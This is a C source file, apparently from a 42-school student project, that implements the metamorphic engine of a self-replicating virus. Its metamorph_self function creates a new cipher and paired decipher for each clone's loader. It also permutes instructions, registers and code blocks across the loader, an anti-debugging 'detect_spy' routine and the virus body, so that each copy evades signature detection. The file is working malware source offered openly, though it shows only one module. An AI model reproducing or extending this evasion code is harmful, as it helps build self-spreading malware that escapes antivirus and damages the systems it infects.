/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph_self.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
/*   Updated: 2020/03/01 19:13:54 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "accessors.h"
#include "polymorphism.h"
#include "errors.h"
#include "loader.h"
#include "virus.h"

/*
** metamorph_self is a metamorphic generator for the virus loader.
**   It generates a new cypher method for the virus
**   Generates a paired decypher for the clone's loader
**   And applies various permutations on the clone's loader code
**
**   Some parts of the loader can't be reg-permutated because of
**   syscall calling conventions.
*/

bool		metamorph_self(struct safe_ptr clone, size_t loader_off, \
			uint64_t son_seed[2], uint64_t client_id)
{
	// generate new seed
	uint64_t unique_seed = polymorphic_seed_engine(son_seed, client_id);

	// get loader chunk sizes
	size_t	loader_size        = loader_exit - loader_entry;
	size_t	detect_spy_size    = (size_t)detect_spy_end - (size_t)detect_spy;

	// get client loader offsets
	size_t	loader_entry_off  = loader_off;
	size_t	detect_spy_off    = loader_off + (size_t)detect_spy - (size_t)loader_entry;

	// get client loader pointers
	void	*clone_loader_entry  = safe(clone, loader_entry_off, loader_size);
	void	*clone_detect_spy    = safe(clone, detect_spy_off, detect_spy_size);

	// get client virus pointer
	size_t	virus_size        = _start - virus;
	size_t	loader_virus_dist = virus - loader_entry;
	size_t	clone_virus_off   = loader_off + loader_virus_dist;
	void	*entire_virus     = safe(clone, clone_virus_off, virus_size);

	if (!clone_loader_entry || !clone_detect_spy || !entire_virus)
		return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	// metamorph self and client
	if (!permutate_instructions(clone_loader_entry, unique_seed, loader_size)
	|| !permutate_registers(clone_loader_entry, unique_seed, loader_size)
	|| !permutate_instructions(clone_detect_spy, unique_seed, detect_spy_size)
	|| !permutate_blocks(entire_virus, unique_seed, virus_size)
	|| !true)
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);

	return true;
}
